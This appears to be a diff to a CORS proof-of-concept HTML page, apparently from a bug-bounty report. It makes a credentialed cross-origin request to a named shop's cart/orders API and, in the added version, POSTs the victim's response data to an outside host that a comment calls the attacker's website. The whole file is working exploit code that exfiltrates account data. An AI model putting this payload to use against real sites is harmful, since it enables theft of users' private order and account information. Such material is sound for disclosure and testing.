@@ -1,22 +1,24 @@
 <html>
-     <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list?opca=", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
-     </body>
- </html>
+<body>
+<button type='button' onclick='cors()'>CORS</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", "http://test.tulexx.pl/", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data="+a);
+}
+};
+xhttp.open("GET", "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list?opca=", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
